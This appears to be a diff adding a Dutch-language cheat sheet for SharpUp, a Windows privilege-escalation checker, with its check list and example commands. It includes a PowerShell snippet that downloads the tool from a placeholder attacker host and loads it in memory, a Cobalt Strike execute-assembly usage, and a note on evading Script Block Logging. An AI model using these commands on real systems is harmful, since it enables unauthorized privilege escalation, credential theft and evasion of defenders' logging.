@@ -1,0 +1,47 @@
+# SharpUp — Privilege escalation vector checker (C# port van PowerUp)
+# Scant Windows systeem op veelvoorkomende privilege escalation misconfigurations
+#
+# === Syntax ===
+# SharpUp.exe [commando]
+#
+# === Commando's ===
+# audit                          Voer alle checks uit
+# AlwaysInstallElevated          Check AlwaysInstallElevated register key
+# CachedGPPPassword              Zoek cached Group Policy wachtwoorden
+# HijackablePaths                Onveilige PATH directories
+# McAfeeSitelistFiles            McAfee sitelist bestanden met credentials
+# ModifiableScheduledTask        Schrijfbare scheduled tasks
+# ModifiableScheduledTaskFile    Schrijfbare scheduled task binaries
+# ModifiableServiceBinaries      Schrijfbare service binaries
+# ModifiableServiceRegistryKeys  Schrijfbare service register keys
+# ModifiableServices             Services met wijzigbare configuratie
+# ProcessDLLHijack               DLL hijacking in draaiende processen
+# RegistryAutoLogon              Autologon credentials in registry
+# RegistryAutoruns               Schrijfbare autorun programma's
+# TokenPrivileges                Interessante token privileges
+# UnattendedInstallFiles         Unattend.xml met credentials
+# UnquotedServicePath            Unquoted service paden
+#
+# === Voorbeelden ===
+
+# Volledige audit
+SharpUp.exe audit
+
+# Enkele check uitvoeren
+SharpUp.exe ModifiableServices
+SharpUp.exe UnquotedServicePath
+SharpUp.exe AlwaysInstallElevated
+SharpUp.exe TokenPrivileges
+SharpUp.exe HijackablePaths
+
+# Via PowerShell in-memory laden
+$data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/SharpUp.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[SharpUp.Program]::Main("audit")
+
+# Via execute-assembly (Cobalt Strike / Covenant)
+# execute-assembly SharpUp.exe audit
+
+# NOTE: Draait zonder admin rechten — zoekt naar wat de huidige gebruiker kan misbruiken
+# NOTE: C# versie van PowerUp — geen PowerShell nodig, omzeilt Script Block Logging
+# NOTE: Combineer met winPEAS voor volledige enumeratie
